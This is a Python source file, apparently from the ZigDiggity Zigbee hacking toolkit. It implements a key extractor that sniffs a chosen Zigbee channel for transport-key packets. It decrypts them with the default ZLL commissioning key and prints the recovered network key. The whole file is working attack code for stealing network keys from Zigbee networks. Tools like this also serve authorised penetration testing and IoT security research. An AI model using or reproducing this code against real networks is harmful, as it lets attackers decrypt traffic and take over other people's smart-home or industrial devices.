#!/usr/bin/env python
from zigdiggity.interface.console import print_info, print_notify
import zigdiggity.crypto.utils as crypto_utils
from zigdiggity.packets.aps import is_transport_key
from zigdiggity.packets.utils import get_extended_source, extended_address_bytes, get_pan_id
from PyInquirer import prompt
from zigdiggity.misc.utils import NumberValidator


class KeyExtractor(object):
    def __init__(self, radio):
        self.radio = radio

    def extractKeyOnChannel(self, channel):
        self.radio.set_channel(channel)

        print_notify("Listening to channel %d" % self.radio.get_channel())

        while True:
            frame = self.radio.receive()
            if is_transport_key(frame):
                print_notify("Got transport key packet")
                if get_extended_source(frame) is not None:
                    print("Got extended source")
                    extended_source_bytes = extended_address_bytes(
                        get_extended_source(frame))
                    decrypted, valid = crypto_utils.zigbee_packet_decrypt(
                        crypto_utils.DEFAULT_ZLL_COMMISSION_KEY, frame, extended_source_bytes)
                    if valid:
                        print_notify(
                            "Network key acquired for PAN 0x%04x" % get_pan_id(frame))
                        network_key = bytes(decrypted)[2:18]
                        print_info("Extracted key is 0x%s" % network_key.hex())

    def extractKey(self):
        channelAns = prompt([{
            'type': 'input',
            'name': 'channel',
            'message': 'Which channel would you like to use?',
            'validate': NumberValidator,
            'filter': lambda val: int(val)
        }])

        if "channel" in channelAns:
            self.extractKeyOnChannel(channelAns["channel"])
